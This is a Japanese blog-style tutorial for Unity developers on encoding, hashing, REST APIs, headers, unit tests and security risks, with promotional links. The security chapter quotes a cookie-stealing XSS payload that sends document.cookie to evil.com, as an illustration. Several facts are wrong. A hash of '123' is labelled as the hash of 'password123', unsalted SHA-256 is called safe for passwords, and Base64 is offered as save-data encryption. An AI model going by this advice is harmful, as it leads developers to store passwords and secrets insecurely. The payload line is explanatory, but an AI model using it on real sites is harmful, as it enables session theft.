# API実装で3時間ハマって気づいた「プログラマーが知らないと恥ずかしい基礎知識」6選

---

**ゲーム開発のご相談：**
https://ryuryugame.netlify.app/

**AI観光ガイドの導入：**
https://guidecastai.netlify.app/

---

## ChatGPTでAPI実装を効率化する前に知っておきたい基礎知識

ChatGPTにAPI実装を任せるとき、「コード書いて」だけでは非効率。

具体的な指示ができれば、より正確で実用的なコードが生成される。

そのために必要なのが、API実装の基礎知識。

エンコード、ハッシュ値、REST API...

これらを理解していれば、ChatGPTとの「会話の質」が劇的に向上する。

## 基礎知識を学ぶことで得られるメリット

### 曖昧な指示から具体的な指示へ

**Before：**
- 「API作って」
- 「エラー直して」
- 「セキュアにして」

**After：**
- 「JWTトークンで認証するREST APIを作って」
- 「Content-Typeヘッダーの設定を確認して」
- 「パスワードをSHA-256でハッシュ化して保存して」

### 問題解決スピードの向上

エラーメッセージを見て、「あ、これはエンコーディングの問題だな」と即座に原因を特定できるようになる。

---

## 知っておきたい6つの基礎知識

1. **文字化け**が起きる理由（エンコード）
2. **パスワード**を「リセットしかできない」理由（ハッシュ値）
3. **GETとPOST**の違い（REST API）
4. **エラーの原因**になるヘッダーの話
5. **バグを防ぐ**テストの基本
6. **やっちゃいけない**セキュリティの話

---

## 【第1章】エンコード・デコード：文字化けの原因はここにある

前に、Slackで日本語を送ったら「????????????」になったことがある。

原因？**文字エンコーディング**の不一致。

UTF-8で送った文字を、受け取り側がShift-JISで解釈したから。

でもそもそも、**コンピューターは0と1しか分からない**のに、なぜ日本語が表示できるのか？

### 人間語と機械語の変換

```
人間：「こんにちは」
　　↓（エンコード）
機械：「01001000 01100101 01101100...」
　　↓（デコード）
人間：「こんにちは」
```

コンピューターは**0と1しか理解できない**。
だから「翻訳」が必要になる。

### 身近なエンコードの例

#### 1. Base64：メールの添付ファイル
メールで画像を送る時、実はこんな感じに変換されてる：

```
元の画像データ: [バイナリデータ]
　　↓
Base64エンコード: "iVBORw0KGgoAAAANSUhEUgAA..."
```

**なぜBase64？**
- メールは「テキスト専用」だった時代の名残
- 画像も「文字」として送る必要があった

#### 2. URLエンコード：スペースが「%20」になる理由
Google検索で「Unity API」を検索すると、URLがこうなる：

```
元の検索語: "Unity API"
　　↓
URLエンコード: "Unity%20API"
```

**スペース → %20**
**日本語 → %E3%81%82...**

ブラウザが自動でやってくれるから普段は気づかない。

#### 3. UTF-8：世界中の文字を扱う理由
```
「あ」という文字:
UTF-8: E3 81 82
UTF-16: 30 42
Shift-JIS: 82 A0
```

UTF-8が標準になった理由：
- 英語もひらがなも絵文字も全部OK
- ファイルサイズが効率的
- Webの標準

### Unityでの実例

```csharp
// 文字列をBase64エンコード
string original = "Unity開発者";
byte[] bytes = System.Text.Encoding.UTF8.GetBytes(original);
string encoded = System.Convert.ToBase64String(bytes);

// デコード
byte[] decodedBytes = System.Convert.FromBase64String(encoded);
string decoded = System.Text.Encoding.UTF8.GetString(decodedBytes);
```

**これで何ができる？**
- セーブデータの暗号化
- API通信でのデータ送信
- 設定ファイルの保護

---

## 【第2章】ハッシュ値：パスワードが「リセットしかできない」理由

GitHubの2段階認証を設定したとき、ふと疑問に思った。

「パスワード忘れた」を押すと、**「リセット用リンク」が送られてくる**。

なぜ「あなたのパスワードはXXXです」と教えてくれないのか？

答え：**サービス側もパスワードを知らないから**。

### パスワードの正体

Webサービスのサーバーには、こんなデータが保存されてる：

```
ユーザー名: yamada_taro
パスワード: （保存されていない）
ハッシュ値: a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3
```

**生のパスワード**は保存しない。
**ハッシュ値**だけ保存する。

### ハッシュ値の特徴

#### 1. 一方通行
```
「password123」→ ハッシュ化 → 「a665a45920422f9d...」
　　　　　　　　　　　　　　　　　↓
「a665a45920422f9d...」→ 復元 → 【不可能】
```

卵から鶏は生まれないのと同じ。

#### 2. 同じ入力 = 同じ出力
```
「password123」→ 常に → 「a665a45920422f9d...」
```

毎回同じハッシュ値になる。
だからログイン時に照合できる。

#### 3. 1文字でも違えば全然違う
```
「password123」→「a665a45920422f9d...」
「password124」→「b2f5ff47436671b9...」
```

1文字変わっただけで全く違うハッシュ値になる。

### MD5は危険、SHA-256が安全

#### ❌ MD5：古くて危険
```
MD5("password123") = "482c811da5d5b4bc6d497ffa98491e38"
```
**なぜ危険？**
- 32文字と短い
- 「衝突」が発見されている
- 解読ツールが出回っている

#### ⭕ SHA-256：現在の標準
```
SHA-256("password123") = "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
```
**なぜ安全？**
- 64文字と長い
- 衝突が発見されていない
- 計算に時間がかかる

### Unityでの実例

```csharp
using System.Security.Cryptography;
using System.Text;

public string GetSHA256Hash(string input)
{
    using (SHA256 sha256 = SHA256.Create())
    {
        byte[] inputBytes = Encoding.UTF8.GetBytes(input);
        byte[] hashBytes = sha256.ComputeHash(inputBytes);

        StringBuilder sb = new StringBuilder();
        foreach (byte b in hashBytes)
        {
            sb.Append(b.ToString("x2"));
        }
        return sb.ToString();
    }
}
```

**使い道：**
- セーブデータの改ざん検知
- ファイルの整合性チェック
- 一意IDの生成

---

## 【第3章】REST API：GET、POST、PUT、DELETEって結局何が違うのか

APIドキュメントを読んでて、いつも混乱する。

```
GET /users/{id}
POST /users
PUT /users/{id}
DELETE /users/{id}
```

全部「/users」じゃん。何が違うの？

これ、**コンビニでのやり取り**と同じだと気づいた。

- GET = 「商品見せて」
- POST = 「新しく注文」
- PUT = 「注文内容変更」
- DELETE = 「キャンセル」

### カフェの注文システムに例える

```
お客さん（クライアント）⇄ カフェ（サーバー）
```

#### ❶ GET：メニューを見る
```
お客さん：「メニューを見せてください」
　　↓
GET /menu
　　↓
カフェ：「コーヒー300円、ラテ400円、...」
```

#### ❂ POST：新しい注文
```
お客さん：「ラテを1つお願いします」
　　↓
POST /order
{
  "item": "latte",
  "quantity": 1
}
　　↓
カフェ：「注文番号123で承りました」
```

#### ❸ PUT：注文の変更
```
お客さん：「注文123番、サイズをLに変更してください」
　　↓
PUT /order/123
{
  "size": "L"
}
　　↓
カフェ：「承知しました」
```

#### ❹ DELETE：注文のキャンセル
```
お客さん：「注文123番をキャンセルしてください」
　　↓
DELETE /order/123
　　↓
カフェ：「キャンセルしました」
```

### REST APIの4つのルール

#### ❶ エンドポイント = 窓口の場所
```
/users     ← ユーザー関連の窓口
/products  ← 商品関連の窓口
/orders    ← 注文関連の窓口
```

#### ❷ リソース = 操作する「もの」
```
GET /users/123     ← ユーザー123番の情報
POST /products     ← 新しい商品を作成
DELETE /orders/456 ← 注文456番を削除
```

#### ❸ HTTPメソッド = 操作の種類
```
GET    = 読み取り専用（見るだけ）
POST   = 新規作成
PUT    = 更新・置換
DELETE = 削除
```

#### ❹ ステータスコード = 結果の報告
```
200 OK          = 成功
201 Created     = 作成成功
400 Bad Request = リクエストが変
401 Unauthorized = 認証エラー
404 Not Found   = 見つからない
500 Server Error = サーバーエラー
```

### UnityでREST APIを叩く基本

```csharp
using UnityEngine;
using UnityEngine.Networking;
using System.Collections;

public class APIManager : MonoBehaviour
{
    [System.Serializable]
    public class User
    {
        public int id;
        public string name;
        public string email;
    }

    public IEnumerator GetUser(int userId)
    {
        string url = $"https://api.example.com/users/{userId}";

        using (UnityWebRequest request = UnityWebRequest.Get(url))
        {
            yield return request.SendWebRequest();

            if (request.result == UnityWebRequest.Result.Success)
            {
                string json = request.downloadHandler.text;
                User user = JsonUtility.FromJson<User>(json);
                Debug.Log($"ユーザー名: {user.name}");
            }
            else
            {
                Debug.LogError($"エラー: {request.error}");
            }
        }
    }
}
```

**これができるようになると：**
- ランキング機能
- ユーザー認証
- クラウドセーブ
- リアルタイム通信

---

## 【第4章】通信の身分証：リクエストヘッダー

郵便物を送る時、**宛先**と**差出人**を書くよね。

Web通信も同じ。
**ヘッダー**に「誰が」「何を」「どう送るか」を書く。

### ヘッダーの種類

#### ❶ Authorization：「私は○○です」の証明
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**例えるなら：**
- 会員証を見せる
- 身分証明書を提示
- 合言葉を言う

#### ❷ Content-Type：「これは○○です」の宣言
```
Content-Type: application/json    ← JSONデータです
Content-Type: text/plain          ← テキストです
Content-Type: image/png           ← PNG画像です
```

**例えるなら：**
- 「これは履歴書です」
- 「これは写真です」
- 「これは契約書です」

#### ❸ User-Agent：「○○から来ました」の挨拶
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0
User-Agent: Unity/2022.3.0f1 (UnityWebRequest)
```

**例えるなら：**
- 「Chromeブラウザから来ました」
- 「Unity 2022から来ました」
- 「iPhoneのSafariから来ました」

### 実際のHTTPリクエスト

```
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer abc123xyz
User-Agent: Unity/2022.3.0f1

{
  "name": "山田太郎",
  "email": "yamada@example.com"
}
```

**解読してみると：**
- **POST /api/users**：ユーザー作成API
- **Host**：api.example.com サーバー
- **Content-Type**：JSON形式で送信
- **Authorization**：トークン abc123xyz で認証
- **User-Agent**：Unity 2022.3 から送信

### Unityでヘッダーを設定

```csharp
public IEnumerator PostUserWithHeaders(string userData)
{
    string url = "https://api.example.com/users";
    byte[] bodyRaw = System.Text.Encoding.UTF8.GetBytes(userData);

    using (UnityWebRequest request = new UnityWebRequest(url, "POST"))
    {
        request.uploadHandler = new UploadHandlerRaw(bodyRaw);
        request.downloadHandler = new DownloadHandlerBuffer();

        // ヘッダーを設定
        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("Authorization", "Bearer " + GetAccessToken());
        request.SetRequestHeader("User-Agent", "MyUnityGame/1.0");

        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("ユーザー作成成功");
        }
        else
        {
            Debug.LogError($"エラー: {request.responseCode} - {request.error}");
        }
    }
}
```

### デバッグ時に絶対見るべき場所

**Chrome Developer Tools**で実際のヘッダーを確認：

```
1. F12を押す
2. Networkタブを開く
3. APIリクエストを実行
4. リクエストをクリック
5. Headersタブを確認
```

**ここで分かること：**
- 送信したヘッダー
- 受信したヘッダー
- エラーの原因
- 認証の状態

---

## 【第5章】コードの品質保証：Unityテスト

料理を作る時、**味見**するよね。

プログラムも同じ。
**テスト**で動作確認する。

### 料理の味見に例える

#### ❶ 単体テスト：材料一つ一つの味見
```
塩 → 塩辛い ✓
砂糖 → 甘い ✓
醤油 → しょっぱい ✓
```

**コードだと：**
```csharp
// 関数1つ1つをテスト
[Test]
public void CalculateDamage_正常値()
{
    int damage = Calculator.CalculateDamage(100, 10);
    Assert.AreEqual(90, damage);
}
```

#### ❷ 統合テスト：完成した料理の味見
```
塩 + 砂糖 + 醤油 = 照り焼きソース ✓
```

**コードだと：**
```csharp
// 複数のコンポーネントをまとめてテスト
[Test]
public void BattleSystem_攻撃から結果まで()
{
    Player player = new Player();
    Enemy enemy = new Enemy();
    BattleManager battle = new BattleManager(player, enemy);

    BattleResult result = battle.Attack(player, enemy);

    Assert.IsTrue(result.IsSuccess);
    Assert.AreEqual(90, enemy.HP);
}
```

### Unityでの実際のテスト

#### Test Runnerの使い方

**1. Test Runnerを開く**
```
Window > General > Test Runner
```

**2. テストフォルダを作成**
```
Assets/
├── Scripts/
├── Tests/        ← ここにテストを配置
│   ├── EditMode/
│   └── PlayMode/
```

**3. テストコードを書く**
```csharp
using NUnit.Framework;
using UnityEngine;

public class PlayerTests
{
    [Test]
    public void Player_初期HP100()
    {
        // Arrange
        Player player = new Player();

        // Act
        int hp = player.GetHP();

        // Assert
        Assert.AreEqual(100, hp);
    }

    [Test]
    public void Player_ダメージ受ける()
    {
        // Arrange
        Player player = new Player();

        // Act
        player.TakeDamage(30);

        // Assert
        Assert.AreEqual(70, player.GetHP());
    }
}
```

### テストの3つのパターン

#### ❶ 正常系テスト
```csharp
[Test]
public void CalculateDamage_正常値()
{
    int result = Calculator.CalculateDamage(100, 10);
    Assert.AreEqual(90, result);
}
```

#### ❷ 異常系テスト
```csharp
[Test]
public void CalculateDamage_攻撃力マイナス()
{
    Assert.Throws<System.ArgumentException>(() => {
        Calculator.CalculateDamage(-10, 10);
    });
}
```

#### ❸ 境界値テスト
```csharp
[Test]
public void CalculateDamage_防御力0()
{
    int result = Calculator.CalculateDamage(100, 0);
    Assert.AreEqual(100, result);
}
```

### 「テストが通る = 安心してリリース」

**テストの恩恵：**
- バグの早期発見
- リファクタリングの安全性
- 仕様の明確化
- 品質の保証

**テストがないと：**
- 手作業でテスト → 時間かかる
- 見落としでバグ → ユーザーに迷惑
- 変更が怖い → 技術的負債

**成功の秘訣：**
```
小さなテストから始める
↓
少しずつ範囲を広げる
↓
自動化で効率アップ
↓
品質向上とスピード両立
```

---

## 【第6章】ネットの落とし穴：セキュリティリスク

家を出る時、**鍵をかけ忘れた**ことある？

Web開発でも同じことが起きる。
**セキュリティの鍵をかけ忘れる**。

### 実際にあった恐怖体験

#### ❶ APIキー漏洩：家の鍵をSNSに投稿

**やらかした例：**
```csharp
public class APIManager : MonoBehaviour
{
    // ❌ GitHubにコミットしてしまう
    private string apiKey = "sk-proj-abcd1234efgh5678ijkl...";

    void Start()
    {
        CallAPI(apiKey);
    }
}
```

**結果：**
- GitHubが公開されて、APIキーが丸見え
- 他人に勝手に使われて、月額10万円の請求
- サービス停止、信用失墜

**正しい方法：**
```csharp
public class APIManager : MonoBehaviour
{
    [SerializeField] private string apiKey; // Inspector から設定

    void Start()
    {
        // または環境変数から取得
        string key = System.Environment.GetEnvironmentVariable("API_KEY");
        CallAPI(key);
    }
}
```

#### ❷ 平文通信：ハガキで秘密を送る危険

**危険な例：**
```
http://api.example.com/login  ← ❌ httpは平文
パスワード: password123 ← 丸見え
```

**安全な例：**
```
https://api.example.com/login ← ⭕ httpsは暗号化
パスワード: [暗号化されて送信] ← 安全
```

**HTTPS化の確認方法：**
- ブラウザの🔒マークを確認
- URLがhttps://で始まる
- 証明書が有効

#### ❸ 認可不足：他人の部屋に入り放題

**やらかした例：**
```csharp
// ユーザーIDをそのままURLに使用
string url = $"https://api.example.com/users/{userId}/profile";

// ❌ 他人のuserIdを指定すれば、他人の情報が見える
```

**結果：**
- ユーザーAがユーザーBの個人情報を閲覧
- プライバシー侵害
- 法的問題

**正しい方法：**
```csharp
public IEnumerator GetUserProfile(int userId)
{
    using (UnityWebRequest request = UnityWebRequest.Get(url))
    {
        // ❶ 認証トークンを送信
        request.SetRequestHeader("Authorization", "Bearer " + accessToken);

        yield return request.SendWebRequest();

        // ❷ サーバー側で「このトークンの持ち主 = userIdの本人」をチェック
        if (request.result == UnityWebRequest.Result.Success)
        {
            // 本人確認済みのデータのみ返される
        }
    }
}
```

#### ❹ CSRF/XSS：偽の招待状に注意

**CSRF（クロスサイトリクエストフォージェリ）：**
```
悪意のあるサイト:
「このボタンを押すとプレゼントがもらえます！」
　　↓ クリック
実際は: ユーザーの代わりに「退会申請」を送信
```

**XSS（クロスサイトスクリプティング）：**
```
コメント欄に悪意のあるスクリプトを投稿:
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
　　↓
他のユーザーのCookieが盗まれる
```

### セキュリティ対策チェックリスト

#### ✓ APIキーの管理
- [ ] GitHubにAPIキーをコミットしていない
- [ ] 環境変数やSecretで管理
- [ ] 定期的にキーをローテーション

#### ✓ 通信の暗号化
- [ ] すべてHTTPSを使用
- [ ] 証明書が有効
- [ ] 古いTLSバージョンを無効化

#### ✓ 認証・認可
- [ ] JWT トークンで認証
- [ ] 本人確認を徹底
- [ ] 権限チェックを実装

#### ✓ 入力値の検証
- [ ] SQLインジェクション対策
- [ ] XSS対策（エスケープ処理）
- [ ] CSRFトークンの実装

### 「セキュリティは後回し」が危険な理由

**開発初期：**
> 「まずは動くものを作ろう。セキュリティは後で」

**リリース直前：**
> 「時間がない。最低限だけでリリース」

**リリース後：**
> 「セキュリティ事故発生。サービス停止、損害賠償...」

**教訓：**
**セキュリティは設計段階から考える**。
後から追加するのは10倍大変。

---

## 【終章】AIと一緒に成長する

あの夜から3ヶ月。

今度はChatGPTに自信を持って質問できる。

> 「JWT認証でリフレッシュトークンの実装を検討してます。セキュリティ面でのベストプラクティスを教えてください」

返ってきた答えは、以前とは段違いに詳しかった。

**基礎知識があると、AIとの会話が10倍濃くなる**。

### 「なんとなく」から「理解して」へ

**Before：なんとなく動く**
- コピペでAPI通信
- エラーが出たら諦める
- セキュリティは「よくわからない」

**After：理解して作る**
- 仕組みを理解してAPI設計
- エラーの原因を特定できる
- セキュリティリスクを事前に防ぐ

### 次に学ぶべきこと

**STEP 1（完了）：**
✓ エンコード・デコード
✓ ハッシュ値
✓ REST API
✓ リクエスト/ヘッダー
✓ Unityテスト
✓ セキュリティリスク

**STEP 2（次のレベル）：**
- JWT認証の詳細
- データベース設計
- Dockerコンテナ
- CI/CD パイプライン
- 負荷分散とスケーリング

**STEP 3（発展）：**
- マイクロサービス設計
- Kubernetes運用
- セキュリティ監査
- パフォーマンス最適化

### 継続学習のコツ

#### ❶ 実際に手を動かす
```
理論だけ → すぐ忘れる
実践付き → 身につく
```

#### ❷ 小さく始める
```
完璧を目指さない
動くものから改善
```

#### ❸ AIを活用する
```
基礎知識 + AI = 最強
```

---

## 追伸

実は、この記事を書いてる間も何度かChatGPTに質問した。

> 「SHA-256のソルトって説明した方がいいですか？」
> 「JWT の説明は次回の記事にした方がいいですか？」

AIが「相談相手」になってる。

これって、**基礎知識があるから**できること。

君も今日から、AIと対等に会話できるエンジニアになろう。

---

**ゲーム開発のご相談：**
https://ryuryugame.netlify.app/

**AI観光ガイドの導入：**
https://guidecastai.netlify.app/

---